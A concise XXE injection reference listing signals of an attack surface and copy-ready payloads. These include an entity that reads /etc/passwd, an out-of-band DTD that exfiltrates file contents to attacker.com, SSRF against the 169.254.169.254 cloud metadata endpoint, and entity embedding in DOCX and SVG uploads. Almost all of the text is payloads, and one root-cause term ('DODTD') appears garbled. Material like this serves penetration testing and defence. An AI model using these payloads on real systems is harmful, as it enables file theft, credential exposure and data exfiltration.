# XXE (XML External Entity Injection) Reference

## Attack Surface Signals
- Content types: `application/xml`, `text/xml`, `application/soap+xml`, `application/xhtml+xml`.
- XML parsers in file uploads: SVG images, Office documents (DOCX/XLSX/PPTX), PDF generators, SAML assertions.
- JSON endpoints accepting XML when `Content-Type` is switched to `application/xml`.

## Attack Vectors & Payloads
1. **Classic Local File Read (In-Band / Direct Output)**:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <root><data>&xxe;</data></root>
   ```
2. **Out-of-Band (OOB / Blind) XXE via External DTD**:
   - Host `eval.dtd` on attacker server:
     `<!ENTITY % file SYSTEM "file:///etc/passwd">`
     `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">`
     `%eval;`
     `%exfil;`
   - Main request:
     ```xml
     <?xml version="1.0"?>
     <!DOCTYPE root [
       <!ENTITY % dtd SYSTEM "http://attacker.com/eval.dtd">
       %dtd;
     ]>
     <root><data>test</data></root>
     ```
3. **Error-Based Blind XXE**:
   - Trigger parse error referencing non-existent file containing extracted data.
4. **SSRF via XXE**:
   - `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`
5. **Office Document / SVG XXE**:
   - Embed entity definition into `word/document.xml` of `.docx` or directly inside `.svg` `<svg ...>&xxe;</svg>`.

## Common Root Causes
- XML parser configured with `DODTD` or `resolveEntities` enabled and `external-general-entities` / `external-parameter-entities` permitted.
